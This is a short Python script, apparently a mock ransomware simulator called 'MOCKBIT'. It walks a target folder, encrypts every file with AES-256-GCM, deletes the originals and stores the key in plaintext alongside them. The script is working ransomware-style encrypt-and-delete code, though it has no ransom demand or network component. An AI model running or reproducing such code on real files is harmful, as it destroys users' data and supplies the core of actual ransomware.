import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Zielordner anpassen!
START_PATH = "folder"
KEY_FILENAME = "MOCKBIT_KEY.txt"
NONCE_SIZE = 12  # Bytes for AES-GCM nonce



def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct_bytes, tag = cipher.encrypt_and_digest(data)
    with open(file_path + ".mock", "wb") as f:
        f.write(nonce + tag + ct_bytes)
    os.remove(file_path)

def find_and_encrypt_all_files(path, key):
    for dirpath, _, files in os.walk(path):
        for name in files:
            file_path = os.path.join(dirpath, name)
            if name.endswith(".mock") or name == KEY_FILENAME:
                continue
            try:
                encrypt_file(file_path, key)
                print("Verschlüsselt:", file_path)
            except Exception as e:
                print("Fehler bei", file_path, e)

if __name__ == "__main__":
    key = get_random_bytes(32)  # AES-256
    key_b64 = base64.b64encode(key).decode()
    # Schlüssel in Datei speichern
    key_path = os.path.join(START_PATH, KEY_FILENAME)
    with open(key_path, "w") as f:
        f.write(key_b64)
    print(f"Schlüssel wurde in {key_path} gespeichert. Unbedingt sichern!")
    find_and_encrypt_all_files(START_PATH, key)
    print("Fertig.")
